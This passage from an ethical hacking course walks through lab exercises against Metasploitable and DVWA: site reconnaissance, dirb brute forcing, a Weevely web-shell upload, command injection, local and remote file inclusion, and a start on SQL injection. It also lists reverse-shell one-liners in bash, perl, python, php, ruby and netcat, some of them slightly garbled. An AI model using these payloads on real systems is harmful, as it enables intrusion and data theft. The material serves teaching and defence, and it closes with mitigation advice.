Technologies used
Other websites on the same server
DNS records
Unlisted files, sub-domains, directories
Exercise 45: Web Site Information gathering
Netcraft site report ( https://toolbar.netcraft.com/site_report )
Netcraft site report is a very useful website that can run a detailed report
about any websites and give you all the information in one location, that is
including all the technologies used in the website and if there is any
vulnerability or trackers used by the website, you can use the data gathered
from the website and cross reference it with exploit Database
(https://www.exploit-db.com/) to see if there are any exploits that can be used
to hack in the website
DNS Information:
We can get a comprehensive DNS information using Robtex DNS lookup.
Robtex is a website that you enter the name of the Site, then Robtex will give
back detailed information about the site. the link to Robtex is:
https://www.robtex.com
S_E_Oblako
12.3. Discovering websites in the same Server
One server can host many website, gaining access to one website may help
gaining access to other websites in the same server, so if you could not find
any other vulnerability in the target website but there are other websites in the
same server. Gaining access to these websites that have vulnerabilities can
lead to gain access to the server itself and then the target website.
You can use Robtex report to see other websites that sharing the same IP
address.
12.4. Subdomains
Subdomains are sites that uses the same domain name, but they are different
in the first phrase for example goole.com have subdomain mail.google.com
that takes you directly to google mail page. Discovering subdomains is
important because some companies have subdomains that are not advertised
and used either internally by employees or used for special customers to give
them access to special services. These subdomains are not seen in search
engines because there are no links leading to them. Because of the hidden
nature of some subdomain they might be not as secured as the public website
and they might contain some vulnerabilities, also many websites have a
subdomain for testing, when they install new update or a big change to the
website they install it in the subdomain for testing before installing the update
in the main website.
Exercise 46: Discovering Subdomains with Knock Tool
Knock is a kali tool that can search any Domain name and find subdomains,
first download the tool, and run it in Kali as the flowing procedure:
S_E_Oblako
1. Login to Kali and open terminal windows
#git clone https://github.com/guelfoweb/knock.git
2. Find where the file download and running the python script
#python knockpy.py 
3. The file will take some time running as it try all possible
subdomains then it gives you the results
12.5. Finding Files and Directories
Website are consisting from directory and files, when you access any page in
S_E_Oblako
the website, you are accessing a file inside a directory for example when you
access page http://10.0.2.5/multillidae/ , in fact you are accessing a folder
called mutillidae inside the website 10.0.2.5 then access a file inside that
folder that give you the page you are browsing
Exercise 47: Finding Files and Directories
1. Open Metasploitable VM from Virtual Box.
2. Login as msfadmin/msfadmin
3. Make sure folder mutillidae exist
4. Check the IP address of Metasploitable machine
5. From Kali open web page to the mutillidae
6. Using dirb tool to find files and folders
#dirb is a tool that come by default as part of Kali and it can search any
website for directories and files using word list attack , to see how drib used
open terminal in Kali and type:
#man dirb
Since dirb uses a brute force attack, it uses a word list to start the attack there
is a default word list that can be used or you can create your own word list
using tool called crunch.
7. Use drip to discover files and folders in the mutillidae website
# dirb http://10.0.2.5/mutillidae -o output.txt
S_E_Oblako
S_E_Oblako
Analyzing the files discovered:
The files discovered is pages that we can access them through web browser
because they are listed under the www directory and they may provide a
valuable information, these files can be accessed from the web browser
following the link as is shown in the screenshot below
- For example we can access : http://10.0.2.5/mutillidae/bhbinfo
- This file shows the PHP design information
- Another example if we check the robots file
S_E_Oblako
- The robots.txt file inform google and other search engine not to list the
files that it in the list above.
- If we check the passwords file in the web browser:
- If we click on the accounts.txt file, we will get the following:
12.6. File uploads, code execution and file exclusion
There are some website allow users to upload files to the website such as
S_E_Oblako
advertisement websites that allow users to upload images If the website is
not secure that may allow users to upload other types of files to the website
that compromise the website and allow adversaries to take control of the
website. In the following exercise we are going to control vulnerable website
by uploading PHP file that will give u a php shell and allow us to control the
website
Exercise 48: File Upload
In this exercise we are going to use the Metasploitable Virtual machine
website, to see how we can use file upload vulnerability on the website to
upload PHP code that will give us full control of the website Server.
1. From Kali open web browser and enter the Metasploitable IP
address then click on DVWA and Login.
2. Login used:
Admin / password
3. Setup DVWA security to low:
S_E_Oblako
4. Click on upload
S_E_Oblako
5. The web site allow us to upload files using the upload button ( in
real life scenarios websites such as classified websites allow you to
upload images and other files)
6. The website is expecting us to upload an image, first we will upload
an image as the site expecting, then will upload a PHP file.
7. Uploading image file to the website: Browse to the Image and select
it then click upload
S_E_Oblako
8. As you can see the picture was uploaded to the link shown
../../hackable/uploads/index.jpg
9. To see the picture uploaded, in Kali Browser, insert the picture link
as shown in below screenshot
S_E_Oblako
Uploading PHP file:
Weevely : Weevely is a stealth PHP web shell that simulate telnet-like
connection. It is an essential tool for web application post exploitation and
can be used as stealth backdoor or as a web shell to manage legit web
accounts, even free hosted ones.
10. We are going to use Weevely tool to create a payload in a php file
and upload it to the website
11. To create php shell file go to Kali terminal and type the following
commands:
#weevely generate 12345 /root/shell.php
(12345 is a password that we protect our file so when it uploaded to the
website only we can use it.
S_E_Oblako
12. The file is generated and stored in Kali under /root
13. Make sure DVWA website Security is set to low
14. Go to the website and upload the shell.php file
S_E_Oblako
15. Use Kali to connect to the file shell.php which we uploaded to the
site
#weevely  password
16. From Weevely> we can run any Linux command in the target
machine
17. To see what other options that Weevely can do just type help
S_E_Oblako
Remote Code Execution:
Remote code execution is the ability to execute a code inside the website and
run OS commands and interacting with the website host operating system.
For example, if the website offers a service that allow the user to verify
connectivity using ping command, that is mean the website allow end users to
interact with the Website operating system. If the website does not sanitize
the input and only pass “ping command” there is a high possibility the user
can pass other commands to the OS that might lead to pulling sensitive
information from the system.
Remote Code Evaluation which is a vulnerability can be exploited if a user
S_E_Oblako
input is injected into a File or a String and executed (evaluated) by the
programming language's parser. Usually this behavior is not intended by the
developer of the web application. A Remote Code Evaluation can lead to a
full compromise of the vulnerable web application and web server. It is
important to note that almost every programming language has code
evaluation functions.
Exercise 49: Remote Code Execution
In the following example we are going to use the Metasploitable virtual
machine web site to exercise remote code execution.
1. Open Web page from Kali Linux to Metasploitable DVWA web
page and click on Command execution.
2. Enter Kali IP address and click ping.
3. In Linux OS we can combined many command in one line using the
sign (;) so we can send ping command followed by the sign; then
any command we choose for example I can send the Kali IP address
followed by command pwb
S_E_Oblako
4. We can use this vulnerability to create a reverse connection that will
give us access to the website OS same way as the shell.php
5. Make kali Linux listen to outside connections
S_E_Oblako
6. Open the webpage to command execution and inter in the Ping field
the following
10.0.2.15; nc –e /bin/sh 10.0.2.15 8080
7. Go back to kali terminal and see the connection established.
8. Now you can run Linux commands inside the Metasploitable
machine.
Notes
users accessing the vulnerable machine using code execution does
not have a root permission and it is limited to the allowed tasks and
commands that a web user can do.
S_E_Oblako
Depending on the website technology, you might need to change the
reverse connection instructions, below is reverse connection
instructions in different programing languages.
You choose the language based on the website, for example if the
website uses PHP, choose PHP instruction below to make the
reverse connection
The IP address of the attack server and the port used, should be
included on the instruction
Kali reverse connection listener should be setup using
#ns -vv -l -p 
Reverse connection code in different languages
BASH
bash -i >& /dev/tcp/10.0.2.15/8080 0>&1
PERL
perl -e 'use
Socket;$i="10.0.2.15";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))
{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh
-i");};'
Python
python -c 'import
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.15",8080));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
PHP
php -r '$sock=fsockopen("10.0.2.15",8080);exec("/bin/sh -i &3
2>&3");'
Ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.2.15",8080).to_i;exec
sprintf("/bin/sh -i &%d 2>&%d",f,f,f)'
Netcat
nc -e /bin/sh 10.0.2.15 8080

Local files inclusion variabilities (LFI)
File inclusions are part of every advanced server-side scripting language on
the web. They are needed to keep web applications code tidy and
maintainable. They also allow web applications to read files from the file
system, provide download functionality, parse configuration files, and do
other similar tasks. If it is not implemented properly, attackers can exploit
them and craft a LFI attack which may lead to information disclosure, cross-
site-Scripting (XSS) and remote code execution (RFI) vulnerabilities.
How to Test
Since LFI occurs when paths passed to "include" statements are not properly
sanitized, in a black box testing approach, we should look for scripts which
take filenames as parameters.
Consider the following example:
http://vulnerable_host/preview.php?file=example.html
This looks like a perfect place to try for LFI. If an attacker is lucky enough,
and instead of selecting the appropriate page from the array by its name, the
script directly includes the input parameter, it is possible to include arbitrary
files on the server.
Typical proof-of-concept would be to load passwd file:
http://vulnerable_host/preview.php?file=../../../../etc/passwd
Exercise 50: File Inclusion
1. In Kali open webpage of Metasploitable machine DVWA page
2. Click on File exclusion
S_E_Oblako
In
the web page address bar and after the word page= inter any name to reveal
the path
3. This give us an error as shown above, from the error we can see the
location of the file which is
/var/www/dvwa/vulnerabilities/fi/include.php
4. The current location at the operating system is under
S_E_Oblako
/var/www/vulnerabilities/fi/
5. if we want to read another file in other directory for example we
need to read /etc/passwd file which contain all users of this machine
we have to go back 5 locations as follow:
6. If we want to see the /ect/passwd file then we should write in the
URL the following? page=../../../../../etc/passwd
7. Here I am asking the Linux terminal to return back 5 spaces to
return to root position so I can read the file /etc/passwd, it is like
someone type cd.. 5 times.
8. Through this website vulnerability we were successful to know all
the users of the machine from the etc/passwd file, same way we can
access any other file.
Remote file inclusion vulnerability
Remote file inclusion vulnerability is the same as local file vulnerability but
the difference is in the address bar we put the IP address of another server
S_E_Oblako
and path to a file that the website will execute, this will allow us open a
backdoor in the website itself. To do this there is parameter in the PHP
configuration file (Allow URL fopen) if this set to On then remote file
inclusion can be done.
Exercise 51: Remote File inclusion
1. To check the function of PHP setting, go to Metasploitable machine
and type the command
#sudo nano /etc/php5/cgi/php.ini
2. Enter root password ( msfadmin)
S_E_Oblako
3. Hit Control W to start search inside nano for (allow_url)
4. Change the second parameter ( allow_url-include=off to on )
5. Control X Then Save and exit
6. In kali machine, create the remote file that will include reverse
connection in the Kali machine, so open leafpad and inter the
S_E_Oblako
following php code
- passthru (“ “) ; enable you to execute any command between the
prickets .
- Save the file in Kali under /var/www/html as .txt file
- In Kali machine listen to external connection using command
#nc –vv –l –p 8080
- Make sure that apache2 service is running in the Kali machine and
you can access the file through browser inside kali
7. I created a webpage in my kali machine called rmotefile.txt, this
webpage includes php script.
8. When it is accessed, it will start reverse connection back to Kali
machine
9. From Kali web browser go to the Metasploitable DVWA page, then
click on file exclusion and add the link to the file in the page as in
S_E_Oblako
the screenshot below
10. See the kali terminal to make sure the connection established
11. Enter commands
12. uname -a
13. pwd
14. ls
S_E_Oblako
12.7. Preventing above vulnerabilities
Uploading files:
If the website functionality need to have users upload files, then a check
should be implemented in the website code for the file type allowing only
expected file type to be uploaded, for example if the website expecting users
to upload jpg pictures then the website should allow only jpg files to be
uploaded and should prevent any other types from being uploaded.
Code Execution:
Code execution should be prevented, and the page should not accept any kind
of code, if the page must have such a function then make sure that:
Sanitize user input; not easy due to the big number of possible
bypasses of restrictions.
Do not let users decide the extension or content of files on the web
server and use safe practices for secure file uploads.
Do not Pass any user-controlled input inside evaluation functions or
callbacks.
Try to blacklist special characters or function names. Exactly as
sanitizing this is almost impossible to safely implement.
File Inclusion:
The file inclusion should be disabled in the php.ini file for both features
allow_url_fopen = off
allow_url_include = off
The other way to prevent file inclusion is to use static page inclusion not
dynamic page inclusion in the php web design.
Web Application Firewall (WAF)
A WAF or Web Application Firewall helps protect web applications by
filtering and monitoring HTTP traffic between a web application and the
Internet. It typically protects web applications from attacks such as cross-site
forgery, cross-site-scripting (XSS), file inclusion, and SQL injection, among
others. A WAF is a protocol layer 7 defense (in the OSI model) and is not
designed to defend against all types of attacks. This method of attack
mitigation is usually part of a suite of tools which together create a holistic
defense against a range of attack vectors.

SQL Injection
SQL injection is one of the most common web hacking techniques.
SQL injection is the placement of malicious code in SQL
statements, via web page input. If the website has a database and
expect users to login for example and having fields for username
and password, the hackers may use these fields to enter SQL
statements that may lead to bypass the authentication and give
direct access to the database.
In this section we are going to do manual and automated SQL
injections, and list the recommendations to protect websites against
SQL injection.
S_E_Oblako
13. SQL injection
Most Websites use Database to store data such as files, pictures, audio, and
video and more. The web application uses the database to stores and retrieve
web contents. Website applications uses SQL language to interact with the
database.
SQL injection vulnerability give the attacker an access to the database where
he can read all database files that include accounts and passwords which
allow him to access the systems using legitimate account and therefore
extremely hard to discover. SQL injection is more powerful than PHP scripts
and file inclusion techniques because it gives direct access to the database
and no need to access the operating system
Exercise 52: Logging to Database
This exercise is to introduce database and some SQL commands to those who
are not familiar with databases we going to access database that is used by
web application and show some database tables and their contents
1. Start Metasploitable machine
2. Open Kali machine terminal window
3. To access database you need the database user in this exercise
database user is root
#mysql –u root –h 10.0.2.5 (IP address of Metasploitable machine to access
the)
4. When you get MySQL> prompts that means that you are now inside
the database and you can run SQL commands to show database
